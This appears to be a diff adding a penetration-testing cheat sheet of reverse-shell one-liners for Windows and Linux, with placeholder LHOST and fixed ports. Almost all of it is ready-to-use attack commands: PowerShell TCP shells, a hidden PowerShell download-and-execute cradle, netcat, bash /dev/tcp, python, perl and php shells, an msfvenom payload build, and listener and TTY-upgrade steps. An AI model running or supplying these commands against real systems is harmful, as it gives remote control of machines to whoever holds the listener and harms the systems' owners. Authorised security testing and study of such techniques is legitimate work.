@@ -1,0 +1,39 @@
+PTD reverse-shell one-liners.  Replace LHOST + PORT.  PORT MUST be 4444, 5555, or 6666.
+( The `winrev` alias auto-substitutes your $LHOST and a port arg into these. )
+================================================================================
+
+--- WINDOWS: PowerShell TCP (most reliable) --------------------------------------
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
+
+--- WINDOWS: PowerShell one-liner, base64-ready (encode then run: powershell -nop -e <B64>) ---
+# Kali:  echo -n '<the $c=... body above, no outer powershell>' | iconv -t UTF-16LE | base64 -w0
+
+--- WINDOWS: nc.exe (upload nc.exe first) ----------------------------------------
+nc.exe LHOST PORT -e cmd.exe
+nc64.exe LHOST PORT -e powershell.exe
+
+--- WINDOWS: conpty / mshta / rundll fallback ------------------------------------
+cmd.exe /c "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8081/rev.ps1')"
+
+--- WINDOWS: msfvenom-built exe (plain nc catch; NOT the one MSF use) -------------
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=PORT -f exe -o rev.exe
+
+--- LINUX: bash / sh -------------------------------------------------------------
+bash -i >& /dev/tcp/LHOST/PORT 0>&1
+sh -i >& /dev/tcp/LHOST/PORT 0>&1
+
+--- LINUX: python3 (with PTY) ----------------------------------------------------
+python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("LHOST",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+
+--- LINUX: nc variants -----------------------------------------------------------
+nc LHOST PORT -e /bin/bash
+rm /tmp/f;mkfifo /tmp/f;nc LHOST PORT </tmp/f|/bin/sh>/tmp/f 2>&1;rm /tmp/f
+
+--- LINUX: perl / php / ruby -----------------------------------------------------
+perl -e 'use Socket;$i="LHOST";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+php -r '$s=fsockopen("LHOST",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+================================================================================
+Listener (Kali):  rlwrap nc -lvnp PORT       (4444 foothold · 5555 privesc · 6666 spare)
+TTY upgrade after catch (Linux): python3 -c 'import pty;pty.spawn("/bin/bash")'
+  then Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
